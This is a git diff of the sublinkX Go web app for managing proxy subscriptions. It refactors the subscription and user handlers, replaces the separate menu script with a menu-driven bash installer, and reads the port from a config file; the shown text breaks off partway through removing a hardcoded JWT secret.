 func NodeUpdadte(c *gin.Context) {
 	var node models.Node
-	name := c.PostForm("name")
+	NewName := c.PostForm("name")
 	oldname := c.PostForm("oldname")
 	oldlink := c.PostForm("oldlink")
 	link := c.PostForm("link")
-	if name == "" || link == "" {
+	if NewName == "" || link == "" {
 		c.JSON(400, gin.H{
 			"msg": "节点名称 or 备注不能为空",
 		})
@@ -34,7 +34,7 @@ func NodeUpdadte(c *gin.Context) {
 		})
 		return
 	}
-	node.Name = name
+	node.Name = NewName
 	node.Link = link
 	err = node.Update()
 	if err != nil {
diff --git a/api/sub.go b/api/sub.go
index 27b9353..7b8c1fc 100644
--- a/api/sub.go
+++ b/api/sub.go
@@ -1,9 +1,13 @@
+// api/subcription.go
+
 package api
 
 import (
+	// 导入 json 包，用于解析 config 字符串
+	"log"
 	"strconv"
 	"strings"
-	"sublink/models"
+	"sublink/models" // 导入 models 包
 	"time"
 
 	"github.com/gin-gonic/gin"
@@ -43,112 +47,126 @@ func SubGet(c *gin.Context) {
 	})
 }
 
-// 添加节点
+// 添加订阅
 func SubAdd(c *gin.Context) {
 	var sub models.Subcription
 	name := c.PostForm("name")
-	config := c.PostForm("config")
-	nodes := c.PostForm("nodes")
-	if name == "" || nodes == "" {
+	configString := c.PostForm("config") // 这里的 configString 是前端传来的 JSON 字符串
+	nodesString := c.PostForm("nodes")
+
+	if name == "" || nodesString == "" {
 		c.JSON(400, gin.H{
-			"msg": "订阅名称 or 节点不能为空",
+			"msg": "订阅名称或节点不能为空",
 		})
 		return
 	}
-	sub.Nodes = []models.Node{}
-	for _, v := range strings.Split(nodes, ",") {
+
+	// 1. 根据 nodesString 字符串，构建 models.Node 数组
+	var selectedNodes []models.Node
+	for _, nodeName := range strings.Split(nodesString, ",") {
+		trimmedName := strings.TrimSpace(nodeName)
+		if trimmedName == "" {
+			continue
+		}
 		var node models.Node
-		node.Name = v
+		node.Name = trimmedName
 		err := node.Find()
 		if err != nil {
+			log.Printf("Warning: Node with name '%s' not found for subscription '%s'. Skipping.", trimmedName, name)
 			continue
 		}
-		sub.Nodes = append(sub.Nodes, node)
+		selectedNodes = append(selectedNodes, node)
 	}
+	sub.Nodes = selectedNodes
+
+	// 2. 将前端传来的原始排序字符串赋值给 NodeOrder 字段
+	sub.NodeOrder = nodesString
+
+	// 3. 将前端传来的 config JSON 字符串直接赋值给 sub.Config
+	sub.Config = configString // <--- 这里直接赋值字符串
 
-	sub.Config = config
 	sub.Name = name
-	sub.CreateDate = time.Now().Format("2006-01-02 15:04:05")
+	sub.CreateDate = time.Now()
 
 	err := sub.Add()
 	if err != nil {
 		c.JSON(400, gin.H{
-			"msg": "添加失败",
-		})
-		return
-	}
-	err = sub.AddNode() //创建多对多关系
-	if err != nil {
-		c.JSON(400, gin.H{
-			"msg": err.Error(),
+			"msg": "添加订阅失败: " + err.Error(),
 		})
 		return
 	}
+
 	c.JSON(200, gin.H{
 		"code": "00000",
-		"msg":  "添加成功",
+		"msg":  "添加订阅成功",
 	})
 }
 
-// 更新节点
+// 更新订阅
 func SubUpdate(c *gin.Context) {
 	var sub models.Subcription
 	name := c.PostForm("name")
 	oldname := c.PostForm("oldname")
-	config := c.PostForm("config")
-	nodes := c.PostForm("nodes")
-	if name == "" || nodes == "" {
+	configString := c.PostForm("config") // 这里的 configString 是前端传来的 JSON 字符串
+	nodesString := c.PostForm("nodes")
+
+	if name == "" || nodesString == "" {
 		c.JSON(400, gin.H{
-			"msg": "订阅名称 or 节点不能为空",
+			"msg": "订阅名称或节点不能为空",
 		})
 		return
 	}
-	// 查找旧节点
+
+	// 1. 查找要更新的旧订阅
 	sub.Name = oldname
 	err := sub.Find()
 	if err != nil {
 		c.JSON(400, gin.H{
-			"msg": err.Error(),
+			"msg": "查找旧订阅失败: " + err.Error(),
 		})
 		return
 	}
-	// 更新节点
-	sub.Config = config
-	sub.Name = name
-	sub.CreateDate = time.Now().Format("2006-01-02 15:04:05")
-	sub.Nodes = []models.Node{}
-	for _, v := range strings.Split(nodes, ",") {
+
+	// 2. 根据 nodesString 字符串，构建新的 models.Node 数组
+	var newSelectedNodes []models.Node
+	for _, nodeName := range strings.Split(nodesString, ",") {
+		trimmedName := strings.TrimSpace(nodeName)
+		if trimmedName == "" {
+			continue
+		}
 		var node models.Node
-		node.Name = v
+		node.Name = trimmedName
 		err := node.Find()
 		if err != nil {
+			log.Printf("Warning: Node with name '%s' not found for subscription '%s'. Skipping.", trimmedName, name)
 			continue
 		}
-		sub.Nodes = append(sub.Nodes, node)
+		newSelectedNodes = append(newSelectedNodes, node)
 	}
 
+	// 3. 更新 Subcription 字段
+	sub.Config = configString // <--- 这里直接赋值字符串
+	sub.Name = name
+	sub.CreateDate = time.Now()
+	sub.Nodes = newSelectedNodes
+	sub.NodeOrder = nodesString
+
+	// 4. 调用 sub.Update() 方法
 	err = sub.Update()
 	if err != nil {
 		c.JSON(400, gin.H{
-			"msg": "更新失败",
+			"msg": "更新订阅失败: " + err.Error(),
 		})
 		return
 	}
 
-	err = sub.UpdateNodes() //更新多对多关系
-	if err != nil {
-		c.JSON(400, gin.H{
-			"msg": err.Error(),
-		})
-		return
-	}
 	c.JSON(200, gin.H{
 		"code": "00000",
-		"msg":  "更新成功",
+		"msg":  "更新订阅成功",
 	})
 }
 
-// 删除节点
+// 删除订阅 (无需修改)
 func SubDel(c *gin.Context) {
 	var sub models.Subcription
 	id := c.Query("id")
@@ -158,24 +176,30 @@ func SubDel(c *gin.Context) {
 		})
 		return
 	}
-	x, _ := strconv.Atoi(id)
+	x, err := strconv.Atoi(id) // 增加错误检查
+	if err != nil {
+		c.JSON(400, gin.H{
+			"msg": "无效的 ID: " + err.Error(),
+		})
+		return
+	}
 	sub.ID = x
-	err := sub.Find()
+	err = sub.Find()
 	if err != nil {
 		c.JSON(400, gin.H{
-			"msg": "查找失败",
+			"msg": "查找订阅失败: " + err.Error(),
 		})
 		return
 	}
 	err = sub.Del()
 	if err != nil {
 		c.JSON(400, gin.H{
-			"msg": "删除失败",
+			"msg": "删除订阅失败: " + err.Error(),
 		})
 		return
 	}
 	c.JSON(200, gin.H{
 		"code": "00000",
-		"msg":  "删除成功",
+		"msg":  "删除订阅成功",
 	})
 }
diff --git a/api/user.go b/api/user.go
index 0991c94..e4cf278 100644
--- a/api/user.go
+++ b/api/user.go
@@ -96,8 +96,8 @@ func UserPages(c *gin.Context) {
 // 更新用户信息
 
 func UserSet(c *gin.Context) {
-	NewUsername := c.Param("username")
-	NewPassword := c.Param("password")
+	NewUsername := c.PostForm("username")
+	NewPassword := c.PostForm("password")
 	log.Println(NewUsername, NewPassword)
 	if NewUsername == "" || NewPassword == "" {
 		c.JSON(400, gin.H{
diff --git a/build.sh b/build.sh
index 88934af..fe4a8b8 100755
--- a/build.sh
+++ b/build.sh
@@ -1,2 +1,3 @@
 GOOS=linux GOARCH=amd64 go build -ldflags="-w -s" -o sublink_amd64 main.go
-GOOS=linux GOARCH=arm64 go build -ldflags="-w -s" -o sublink_arm64 main.go
\ No newline at end of file
+GOOS=linux GOARCH=arm64 go build -ldflags="-w -s" -o sublink_arm64 main.go
+GOOS=windows  GOARCH=amd64  go build -ldflags="-w -s" -o sublink_win64.exe main.go
\ No newline at end of file
diff --git a/demo.sh b/demo.sh
deleted file mode 100644
index 985ccbb..0000000
--- a/demo.sh
+++ /dev/null
@@ -1,4 +0,0 @@
-cd G:\sublinkX\sublinkX
-red=$(go run main.go --version)
-echo "版本号:$red"
-read -p "回车"
\ No newline at end of file
diff --git a/install.sh b/install.sh
index dc51e27..4cc0957 100644
--- a/install.sh
+++ b/install.sh
@@ -1,64 +1,428 @@
 #!/bin/bash
-# 检查用户是否为root
-if [ "$(id -u)" != "0" ]; then
-    echo -e "${RED}该脚本必须以root身份运行。${NC}"
-    exit 1
-fi
 
-# 创建一个程序目录
+# 定义颜色
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+YELLOW='\033[0;33m'
+NC='\033[0m' # No Color
+
 INSTALL_DIR="/usr/local/bin/sublink"
+BINARY_NAME="sublink"
+SERVICE_FILE="/etc/systemd/system/sublink.service"
 
-if [ ! -d "$INSTALL_DIR" ]; then
-    mkdir -p "$INSTALL_DIR"
-fi
+# --- 辅助函数 ---
+
+# 检查用户是否为root
+check_root() {
+    if [ "$(id -u)" != "0" ]; then
+        echo -e "${RED}该脚本必须以root身份运行。${NC}"
+        exit 1
+    fi
+}
+
+# 执行命令并检查错误
+execute_command() {
+    local cmd="$1"
+    shift
+    echo -e "${YELLOW}执行: $cmd $@${NC}"
+    output=$("$cmd" "$@" 2>&1)
+    if [ $? -ne 0 ]; then
+        echo -e "${RED}错误: 命令 '$cmd $@' 执行失败。${NC}"
+        echo -e "${RED}输出: ${output}${NC}"
+        return 1
+    fi
+    echo "$output"
+    return 0
+}
 
 # 获取最新的发行版标签
-latest_release=$(curl --silent "https://api.github.com/repos/gooaclok819/sublinkX/releases/latest" | grep '"tag_name":' | sed -E 's/.*"([^"]+)".*/\1/')
-echo "最新版本: $latest_release"
-
-# 检测机器类型
-machine_type=$(uname -m)
-
-if [ "$machine_type" = "x86_64" ]; then
-    file_name="sublink_amd64"
-elif [ "$machine_type" = "aarch64" ]; then
-    file_name="sublink_arm64"
-else
-    echo "不支持的机器类型: $machine_type"
-    exit 1
-fi
+get_latest_release() {
+    curl_output=$(curl --silent "https://api.github.com/repos/gooaclok819/sublinkX/releases/latest")
+    if [ $? -ne 0 ]; then
+        echo ""
+        return 1
+    fi
+    tag_name=$(echo "$curl_output" | grep '"tag_name":' | sed -E 's/.*"([^"]+)".*/\1/')
+    echo "$tag_name"
+    return 0
+}
+
+# 获取当前运行的二进制文件版本
+get_current_binary_version() {
+    if [ -f "$INSTALL_DIR/$BINARY_NAME" ]; then
+        version_output=$(execute_command "$INSTALL_DIR/$BINARY_NAME" "--version")
+        if [ $? -eq 0 ]; then
+            echo "$version_output"
+        else
+            echo "未知"
+        fi
+    else
+        echo "未安装"
+    fi
+}
+
+# 根据机器类型获取二进制文件名
+get_binary_file_name() {
+    machine_type=$(uname -m)
+    if [ "$machine_type" = "x86_64" ]; then
+        echo "sublink_amd64"
+    elif [ "$machine_type" = "aarch64" ]; then
+        echo "sublink_arm64"
+    else
+        echo ""
+        return 1
+    fi
+    return 0
+}
+
+# --- 菜单功能函数 ---
+
+# 启动服务
+start_service() {
+    echo -e "${GREEN}正在启动服务...${NC}"
+    execute_command systemctl start sublink
+    execute_command systemctl daemon-reload
+    echo -e "${GREEN}服务已启动。${NC}"
+}
+
+# 停止服务
+stop_service() {
+    echo -e "${YELLOW}正在停止服务...${NC}"
+    execute_command systemctl stop sublink
+    execute_command systemctl daemon-reload
+    echo -e "${YELLOW}服务已停止。${NC}"
+}
+
+# 查看服务状态
+view_status() {
+    echo -e "${YELLOW}正在查看服务状态...${NC}"
+    execute_command systemctl status sublink
+    echo -e "${NC}按任意键继续...${NC}"
+    read -n 1 -s
+}
+
+# 查看运行目录
+view_run_dir() {
+    echo -e "${GREEN}运行目录: ${INSTALL_DIR}${NC}"
+    echo -e "${YELLOW}需要备份的目录为db,template目录为模版文件可备份可不备份。${NC}"
+    echo -e "${NC}按任意键继续...${NC}"
+    read -n 1 -s
+}
+
+# 修改端口
+modify_port() {
+    read -p "$(echo -e "${YELLOW}请输入新的端口号: ${NC}")" new_port
+
+    if ! [[ "$new_port" =~ ^[0-9]+$ ]]; then
+        echo -e "${RED}无效的端口号，请输入数字。${NC}"
+        return
+    fi
+
+    echo -e "${YELLOW}新的端口号: $new_port${NC}"
+
+    if [ ! -f "$SERVICE_FILE" ]; then
+        echo -e "${RED}服务文件不存在: $SERVICE_FILE。请先运行安装程序。${NC}"
+        return
+    fi
+
+    # 替换或添加 ExecStart 行中的 --port 参数
+    # 查找 ExecStart 行，如果已经有 --port 参数，则替换它；否则，添加它
+    if grep -q "ExecStart=.* --port [0-9]\+" "$SERVICE_FILE"; then
+        # 已经存在 --port 参数，替换它
+        execute_command sed -i -E "s/(--port )[0-9]+/\1$new_port/" "$SERVICE_FILE"
+    else
+        # 不存在 --port 参数，在 ExecStart 后添加它
+        execute_command sed -i -E "s|(ExecStart=.+\s?)|\1run --port $new_port |" "$SERVICE_FILE"
+    fi
+
+    echo -e "${YELLOW}重新加载 systemd 守护进程...${NC}"
+    execute_command systemctl daemon-reload
+    echo -e "${YELLOW}重启 Sublink 服务...${NC}"
+    execute_command systemctl restart sublink
+
+    echo -e "${GREEN}端口修改完成，服务已重启。${NC}"
+    echo -e "${NC}按任意键继续...${NC}"
+    read -n 1 -s
+}
+
+# 更新服务
+update_service() {
+    echo -e "${GREEN}正在检查并更新 Sublink 服务...${NC}"
+
+    latest_release=$(get_latest_release)
+    if [ -z "$latest_release" ]; then
+        echo -e "${RED}无法获取最新版本信息，更新失败。${NC}"
+        echo -e "${NC}按任意键继续...${NC}"
+        read -n 1 -s
+        return
+    fi
+    echo -e "${GREEN}最新版本: $latest_release${NC}"
+
+    current_version=$(get_current_binary_version)
+    echo -e "${GREEN}当前版本: $current_version${NC}"
+
+    if [ "$current_version" = "$latest_release" ]; then
+        echo -e "${GREEN}当前已经是最新版本，无需更新。${NC}"
+        echo -e "${NC}按任意键继续...${NC}"
+        read -n 1 -s
+        return
+    fi
+
+    file_name=$(get_binary_file_name)
+    if [ -z "$file_name" ]; then
+        echo -e "${RED}不支持的机器类型，更新失败。${NC}"
+        echo -e "${NC}按任意键继续...${NC}"
+        read -n 1 -s
+        return
+    fi
+
+    echo -e "${YELLOW}停止 Sublink 服务...${NC}"
+    execute_command systemctl stop sublink || true # 允许停止失败，因为可能未运行
+
+    echo -e "${YELLOW}下载新版本 $latest_release/$file_name...${NC}"
+    temp_file="/tmp/$file_name"
+    execute_command curl -L -o "$temp_file" "https://github.com/gooaclok819/sublinkX/releases/download/$latest_release/$file_name"
+    if [ $? -ne 0 ]; then
+        echo -e "${RED}下载失败，请检查网络连接。${NC}"
+        echo -e "${NC}按任意键继续...${NC}"
+        read -n 1 -s
+        return
+    fi
+
+    echo -e "${YELLOW}设置文件可执行权限...${NC}"
+    execute_command chmod +x "$temp_file"
+
+    echo -e "${YELLOW}移动文件到 ${INSTALL_DIR}/${BINARY_NAME}...${NC}"
+    execute_command mv "$temp_file" "$INSTALL_DIR/$BINARY_NAME"
 
-# 下载文件
-cd ~
-curl -LO "https://github.com/gooaclok819/sublinkX/releases/download/$latest_release/$file_name"
+    echo -e "${YELLOW}重新加载 systemd 守护进程...${NC}"
+    execute_command systemctl daemon-reload
 
-# 设置文件为可执行
-chmod +x $file_name
+    echo -e "${YELLOW}启动并启用 Sublink 服务...${NC}"
+    execute_command systemctl start sublink
+    execute_command systemctl enable sublink
 
-# 移动文件到指定目录
-mv $file_name "$INSTALL_DIR/sublink"
+    echo -e "${GREEN}Sublink 服务更新完成。${NC}"
+    echo -e "${NC}按任意键继续...${NC}"
+    read -n 1 -s
+}
 
-# 创建systemctl服务
-echo "[Unit]
+# 重置账号密码
+reset_account() {
+    read -p "$(echo -e "${YELLOW}请输入新的账号: ${NC}")" new_username
+    read -p "$(echo -e "${YELLOW}请输入新的密码: ${NC}")" new_password
+
+    if [ -z "$new_username" ] || [ -z "$new_password" ]; then
+        echo -e "${RED}账号和密码不能为空。${NC}"
+        echo -e "${NC}按任意键继续...${NC}"
+        read -n 1 -s
+        return
+    fi
+
+    echo -e "${YELLOW}正在重置账号密码...${NC}"
+    # 调用 Go 程序的 setting 命令
+    execute_command "$INSTALL_DIR/$BINARY_NAME" setting --username "$new_username" --password "$new_password"
+    
+    echo -e "${YELLOW}重启 Sublink 服务以应用更改...${NC}"
+    execute_command systemctl restart sublink
+
+    echo -e "${GREEN}账号密码重置成功。${NC}"
+    echo -e "${NC}按任意键继续...${NC}"
+    read -n 1 -s
+}
+
+# 卸载安装
+uninstall_service() {
+    read -p "$(echo -e "${YELLOW}你是否要卸载 Sublink 服务? (y/n): ${NC}")" confirm_uninstall
+    if [ ! "$confirm_uninstall" = "y" ]; then
+        echo -e "${NC}取消卸载。${NC}"
+        return
+    fi
+
+    echo -e "${YELLOW}正在卸载 Sublink 服务...${NC}"
+
+    # 停止服务之前检查服务是否存在
+    if systemctl is-active --quiet sublink; then
+        echo -e "${YELLOW}停止服务...${NC}"
+        execute_command systemctl stop sublink
+    fi
+    if systemctl is-enabled --quiet sublink; then
+        echo -e "${YELLOW}禁用服务...${NC}"
+        execute_command systemctl disable sublink
+    fi
+
+    read -p "$(echo -e "${YELLOW}是否删除 systemd 服务文件 (包含端口设置)? (y/n): ${NC}")" is_del_systemd
+    if [ "$is_del_systemd" = "y" ]; then
+        echo -e "${YELLOW}删除 systemd 服务文件...${NC}"
+        execute_command rm "$SERVICE_FILE"
+        execute_command systemctl daemon-reload # 重新加载以清除服务
+    fi
+
+    echo -e "${YELLOW}删除相关文件和目录...${NC}"
+    execute_command rm -rf "$INSTALL_DIR/$BINARY_NAME" # 删除二进制文件
+    execute_command rm -f "/usr/bin/sublink_installer.sh" # 删除自身脚本
+
+    read -p "$(echo -e "${YELLOW}是否删除模板文件和数据库? (y/n): ${NC}")" is_delete_data
+    if [ "$is_delete_data" = "y" ]; then
+        echo -e "${YELLOW}删除数据目录...${NC}"
+        execute_command rm -rf "$INSTALL_DIR/db"
+        echo -e "${YELLOW}删除模板目录...${NC}"
+        execute_command rm -rf "$INSTALL_DIR/template"
+        echo -e "${YELLOW}删除日志目录...${NC}"
+        execute_command rm -rf "$INSTALL_DIR/logs"
+    fi
+
+    echo -e "${GREEN}卸载完成。${NC}"
+    echo -e "${NC}按任意键继续...${NC}"
+    read -n 1 -s
+    exit 0 # 卸载后直接退出
+}
+
+# --- 主菜单逻辑 ---
+
+show_menu() {
+    clear
+    current_version=$(get_current_binary_version)
+    latest_release=$(get_latest_release)
+    if [ -z "$latest_release" ]; then
+        latest_release="无法获取"
+    fi
+
+    # 获取服务状态
+    service_status=$(systemctl is-active sublink 2>/dev/null)
+    if [ "$service_status" = "active" ]; then
+        display_status="${GREEN}已运行${NC}"
+    else
+        display_status="${RED}未运行${NC}"
+    fi
+
+    echo -e "${YELLOW}--- Sublink 管理菜单 ---${NC}"
+    echo -e "最新版本: ${GREEN}${latest_release}${NC}"
+    echo -e "当前版本: ${GREEN}${current_version}${NC}"
+    echo -e "当前运行状态: ${display_status}"
+    echo -e "${GREEN}1. 启动服务${NC}"
+    echo -e "${GREEN}2. 停止服务${NC}"
+    echo -e "${GREEN}3. 卸载安装${NC}"
+    echo -e "${GREEN}4. 查看服务状态${NC}"
+    echo -e "${GREEN}5. 查看运行目录${NC}"
+    echo -e "${GREEN}6. 修改端口${NC}"
+    echo -e "${GREEN}7. 更新${NC}"
+    echo -e "${GREEN}8. 重置账号密码${NC}"
+    echo -e "${GREEN}0. 退出${NC}"
+    echo -n -e "${YELLOW}请选择一个选项: ${NC}"
+}
+
+handle_menu_option() {
+    read option
+
+    case "$option" in
+        1) start_service ;;
+        2) stop_service ;;
+        3) uninstall_service ;;
+        4) view_status ;;
+        5) view_run_dir ;;
+        6) modify_port ;;
+        7) update_service ;;
+        8) reset_account ;;
+        0) echo -e "${GREEN}退出。${NC}"; exit 0 ;;
+        *) echo -e "${RED}无效的选项，请重新选择。${NC}"; sleep 1 ;;
+    esac
+}
+
+# --- 安装逻辑 ---
+
+install_sublink() {
+    check_root
+
+    echo -e "${YELLOW}--- 正在安装 Sublink 服务 ---${NC}"
+
+    latest_release=$(get_latest_release)
+    if [ -z "$latest_release" ]; then
+        echo -e "${RED}无法获取最新版本信息，安装失败。${NC}"
+        exit 1
+    fi
+    echo -e "${GREEN}最新版本: $latest_release${NC}"
+
+    file_to_download=$(get_binary_file_name)
+    if [ -z "$file_to_download" ]; then
+        echo -e "${RED}不支持的机器类型: $(uname -m)。安装失败。${NC}"
+        exit 1
+    fi
+
+    # 创建程序目录
+    if [ ! -d "$INSTALL_DIR" ]; then
+        echo -e "${YELLOW}创建安装目录: $INSTALL_DIR${NC}"
+        execute_command mkdir -p "$INSTALL_DIR"
+    fi
+
+    # 下载文件
+    echo -e "${YELLOW}下载 Sublink $latest_release 版本到 /tmp/$file_to_download...${NC}"
+    temp_download_path="/tmp/$file_to_download"
+    execute_command curl -L -o "$temp_download_path" "https://github.com/gooaclok819/sublinkX/releases/download/$latest_release/$file_to_download"
+    if [ $? -ne 0 ]; then
+        echo -e "${RED}下载失败，请检查网络连接。${NC}"
+        exit 1
+    fi
+
+    # 设置文件为可执行
+    echo -e "${YELLOW}设置可执行权限...${NC}"
+    execute_command chmod +x "$temp_download_path"
+
+    # 移动文件到指定目录
+    echo -e "${YELLOW}移动二进制文件到 ${INSTALL_DIR}/${BINARY_NAME}...${NC}"
+    execute_command mv "$temp_download_path" "$INSTALL_DIR/$BINARY_NAME"
+
+    # 创建 systemctl 服务文件
+    echo -e "${YELLOW}创建 systemd 服务文件: $SERVICE_FILE${NC}"
+    cat << EOF | tee "$SERVICE_FILE"
+[Unit]
 Description=Sublink Service
+After=network.target
 
 [Service]
-ExecStart=$INSTALL_DIR/sublink
+ExecStart=$INSTALL_DIR/$BINARY_NAME run --port 8000
 WorkingDirectory=$INSTALL_DIR
+Restart=always
+User=root
+Group=root
+# AmbientCapabilities=CAP_NET_BIND_SERVICE # 如果ExecStart使用非root用户，可以考虑添加
+
 [Install]
-WantedBy=multi-user.target" | tee /etc/systemd/system/sublink.service
+WantedBy=multi-user.target
+EOF
+
+    # 重新加载systemd守护进程
+    echo -e "${YELLOW}重新加载 systemd 守护进程...${NC}"
+    execute_command systemctl daemon-reload
 
-# 重新加载systemd守护进程
-systemctl daemon-reload
+    # 启动并启用服务
+    echo -e "${YELLOW}启动并启用 Sublink 服务...${NC}"
+    execute_command systemctl start sublink
+    execute_command systemctl enable sublink
 
-# 启动并启用服务
-systemctl start sublink
-systemctl enable sublink
-echo "服务已启动并已设置为开机启动"
-echo "默认账号admin密码123456 默认端口8000"
-echo "安装完成已经启动输入sublink可以呼出菜单"
+    # 将此脚本自身复制到 /usr/bin，以便可以全局调用菜单
+    echo -e "${YELLOW}将脚本自身复制到 /usr/bin/sublink...${NC}"
+    execute_command cp "$0" "/usr/bin/sublink"
+    execute_command chmod +x "/usr/bin/sublink"
 
+    echo -e "${GREEN}--- 安装完成 ---${NC}"
+    echo -e "${GREEN}默认账号admin, 密码123456 (如果数据库是新的)。${NC}"
+    echo -e "${GREEN}默认端口8000。${NC}"
+    echo -e "${GREEN}服务已启动并已设置为开机启动。${NC}"
+    echo -e "${GREEN}现在输入 'sublink' 可以呼出菜单进行管理。${NC}"
+    echo -e "${NC}按任意键进入菜单...${NC}"
+    read -n 1 -s
+}
+
+# --- 脚本入口点 ---
+
+# 如果没有安装 Go 程序，则执行安装
+if [ ! -f "$INSTALL_DIR/$BINARY_NAME" ] || [ ! -f "$SERVICE_FILE" ]; then
+    install_sublink
+fi
 
-# 下载menu.sh并设置权限
-curl -o /usr/bin/sublink -H "Cache-Control: no-cache" -H "Pragma: no-cache" https://raw.githubusercontent.com/gooaclok819/sublinkX/main/menu.sh
-chmod 755 "/usr/bin/sublink"
+# 循环显示菜单
+while true; do
+    show_menu
+    handle_menu_option
+done
\ No newline at end of file
diff --git a/main.go b/main.go
index bc38ad1..4348780 100644
--- a/main.go
+++ b/main.go
@@ -26,6 +26,7 @@ var embeddedFiles embed.FS
 //go:embed template
 var Template embed.FS
 
+// 版本号
 var version string
 
 func Templateinit() {
@@ -69,10 +70,13 @@ func Templateinit() {
 }
 
 func main() {
-	var port int
+	// 初始化配置
+	models.ConfigInit()
+	config := models.ReadConfig() // 读取配置文件
+	var port = config.Port        // 读取端口号
 	// 获取版本号
 	var Isversion bool
-	version = "1.8"
+	version = "1.9"
 	flag.BoolVar(&Isversion, "version", false, "显示版本号")
 	flag.Parse()
 	if Isversion {
@@ -85,7 +89,6 @@ func main() {
 	args := os.Args
 	// 如果长度小于2则没有接收到任何参数
 	if len(args) < 2 {
-		port = 8000
 		Run(port)
 		return
 	}
@@ -104,6 +107,9 @@ func main() {
 		return
 	case "run":
 		settingCmd.Parse(args[2:])
+		models.SetConfig(models.Config{
+			Port: port,
+		}) // 设置端口
 		Run(port)
 	default:
 		return
diff --git a/menu.sh b/menu.sh
deleted file mode 100644
index 00c5db0..0000000
--- a/menu.sh
+++ /dev/null
@@ -1,166 +0,0 @@
-#!/bin/bash
-function Up {
-    # 获取最新的发行版标签
-    latest_release=$(curl --silent "https://api.github.com/repos/gooaclok819/sublinkX/releases/latest" | grep '"tag_name":' | sed -E 's/.*"([^"]+)".*/\1/')
-    echo "最新版本: $latest_release"
-    # 检测机器类型
-    machine_type=$(uname -m)
-
-    if [ "$machine_type" = "x86_64" ]; then
-        file_name="sublink_amd64"
-    elif [ "$machine_type" = "aarch64" ]; then
-        file_name="sublink_arm64"
-    else
-        echo "不支持的机器类型: $machine_type"
-        exit 1
-    fi
-
-    # 下载文件
-    curl -LO "https://github.com/gooaclok819/sublinkX/releases/download/$latest_release/$file_name"
-
-    # 设置文件为可执行
-    chmod +x $file_name
-
-    # 移动文件到指定目录
-    mv $file_name "$INSTALL_DIR/sublink"
-    echo "更新完成"
-
-}
-function Select {
-    # 获取最新的发行版标签
-    latest_release=$(curl --silent "https://api.github.com/repos/gooaclok819/sublinkX/releases/latest" | grep '"tag_name":' | sed -E 's/.*"([^"]+)".*/\1/')
-    # 获取服务状态
-    cd /usr/local/bin/sublink # 进入sublink目录
-    status=$(systemctl is-active sublink)
-    version=$(./sublink --version)
-    echo "最新版本:$latest_release"
-    echo "当前版本:$version"
-    # 判断服务状态并打印
-    if [ "$status" = "active" ]; then
-        echo "当前运行状态: 已运行"
-    else
-        echo "当前运行状态: 未运行"
-    fi
-    echo "1. 启动服务"
-    echo "2. 停止服务"
-    echo "3. 卸载安装"
-    echo "4. 查看服务状态"
-    echo "5. 查看运行目录"
-    echo "6. 修改端口"
-    echo "7. 更新"
-    echo "8. 重置账号密码"
-    echo "0. 退出"
-    echo -n "请选择一个选项: "
-    read option
-
-    case $option in
-        1)
-            systemctl start sublink
-            systemctl daemon-reload
-            ;;
-        2)
-            systemctl stop sublink
-            systemctl daemon-reload
-            ;;
-        3)
-            # 停止服务之前检查服务是否存在
-            if systemctl is-active --quiet sublink; then
-                systemctl stop sublink
-            fi
-            if systemctl is-enabled --quiet sublink; then
-                systemctl disable sublink
-            fi
-            # 删除服务文件
-            read -p "是否删除systemd服务文件(包含端口设置)(y/n): " isDelSystemd
-            if [ "$isDelSystemd" = "y" ]; then
-                sudo rm /etc/systemd/system/sublink.service
-            fi
-            # 删除相关文件和目录
-            sudo rm -r /usr/local/bin/sublink/sublink
-            sudo rm -r /usr/bin/sublink
-            read -p "是否删除模板文件和数据库(y/n): " isDelete
-            if [ "$isDelete" = "y" ]; then
-                sudo rm -r /usr/local/bin/sublink/db
-                sudo rm -r /usr/local/bin/sublink/template
-                sudo rm -r /usr/local/bin/sublink/logs
-            fi
-            echo "卸载完成"
-            ;;
-        4)
-            systemctl status sublink
-            ;;
-        5)
-            echo "运行目录: /usr/local/bin/sublink"
-            echo "需要备份的目录为db,template目录为模版文件可备份可不备份"
-            cd /usr/local/bin/sublink
-            ;;
-        6)
-            SERVICE_FILE="/etc/systemd/system/sublink.service"
-            read -p "请输入新的端口号: " Port
-            echo "新的端口号: $Port"
-            PARAMETER="run --port $Port"
-            # 检查服务文件是否存在
-            if [ ! -f "$SERVICE_FILE" ]; then
-                echo "服务文件不存在: $SERVICE_FILE"
-                exit 1
-            fi
-
-            # 检查 ExecStart 是否已经包含该参数
-            if grep -q "run --port" "$SERVICE_FILE"; then
-                echo "参数已存在，正在替换..."
-                # 使用 sed 替换 ExecStart 行中的 -port 参数
-                sudo sed -i "s/-port [0-9]\+/-port $Port/" "$SERVICE_FILE"
-            else
-                # 如果没有 -port 参数，添加新参数
-                # 使用 sed 替换 ExecStart 行，添加启动参数
-                sudo sed -i "/^ExecStart=/ s|$| $PARAMETER|" "$SERVICE_FILE"
-                echo "参数已添加到 ExecStart 行: $PARAMETER"
-            fi
-
-            # 重新加载 systemd 守护进程
-            sudo systemctl daemon-reload
-            # 重启 sublink 服务
-            sudo systemctl restart sublink
-
-            echo "服务已重启。"
-
-            ;;
-        7)
-            # 停止服务之前检查服务是否存在
-            if systemctl is-active --quiet sublink; then
-                systemctl stop sublink
-            fi
-            # 检查是否为最新版本
-            if [[ $version = $latest_release ]]; then
-                echo "当前已经是最新版本"
-            else
-                Up
-            fi
-            # 更新菜单
-            sudo rm /usr/bin/sublink
-            curl -o /usr/bin/sublink -H "Cache-Control: no-cache" -H "Pragma: no-cache" https://raw.githubusercontent.com/gooaclok819/sublinkX/main/menu.sh
-            chmod 755 "/usr/bin/sublink"
-            ;;
-        8)
-            read -p "请输入新的账号: " User
-            read -p "请输入新的密码: " Password
-            # 运行二进制文件并传递启动参数，放在后台运行
-            cd /usr/local/bin/sublink
-            ./sublink setting --username "$User" --password "$Password" &
-            # 获取该程序的PID
-            pid=$!
-            # 等待程序完成
-            wait $pid
-            # 如果需要可以在此处进行清理
-            systemctl restart sublink
-            ;;
-        0)
-            exit 0
-            ;;
-        *)
-            echo "无效的选项,请重新选择"
-            Select
-            ;;
-    esac
-}
-Select
diff --git a/middlewares/jwt.go b/middlewares/jwt.go
index 203cf41..d944f49 100644
--- a/middlewares/jwt.go
+++ b/middlewares/jwt.go
@@ -4,12 +4,16 @@ import (
 	"errors"
 	"net/http"
 	"strings"
+	"sublink/models"
 
 	"github.com/dgrijalva/jwt-go"
 	"github.com/gin-gonic/gin"
 )
 
-var Secret = []byte("sublink") // 秘钥
+// 随机密钥
+
+// var Secret = []byte("sublink") // 秘钥
